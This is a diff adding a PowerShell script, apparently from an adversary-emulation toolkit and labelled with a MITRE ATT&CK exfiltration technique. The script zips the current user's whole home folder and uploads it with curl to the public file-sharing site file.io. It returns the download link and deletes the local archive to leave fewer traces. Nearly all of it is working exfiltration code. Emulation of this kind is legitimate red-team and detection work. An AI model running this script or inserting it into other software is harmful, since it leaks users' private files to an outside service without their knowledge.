@@ -1,0 +1,50 @@
+#Title: invoke-exfiltrationWeb
+#Technique: T1567
+#Tactic: TA0010
+
+function invoke-exfiltrationWeb
+    {
+    <#
+    .SYNOPSIS
+    # This script
+    .DESCRIPTION
+    Attack Commands: Run with command_prompt! Elevation is not Required (e.g. root or admin)
+
+    .LINK
+
+    #>
+    $good = $false
+    $results = $null
+	# Compress the User folder and send it to the temporary files directory
+	Compress-Archive -Path $env:HOMEPATH -DestinationPath $env:HOMEPATH\AppData\Local\Temp\home.zip
+	# Open a CMD terminal to use CURL to send the compressed file to the https://file.io website. 
+	$response = cmd /c 'cd %HOMEPATH%\AppData\Local\Temp\ && curl -F "file=@home.zip" https://file.io' | ConvertFrom-Json
+	# Check if the upload was succesful
+	if ($response.success -eq $true) {
+		$good = $true
+		$results = "Exfiltrated files are available on: " + $response.link
+	}
+	else {
+		$results = "Something went wrong uploading the file. Perhaps the file is larger than 100MB"
+	}
+	Remove-Item $env:HOMEPATH\AppData\Local\Temp\home.zip
+    return @{results=$results;success=$good}
+}
+
+#Main program
+$execute = {
+  
+}
+
+#GiveMeData if needed
+
+#get-credentials
+$execute = invoke-exfiltrationWeb
+
+#PutData if needed
+  # if($execute.success)
+  # {
+    
+  # }
+
+return @{results=$execute.results;success=$execute.success}
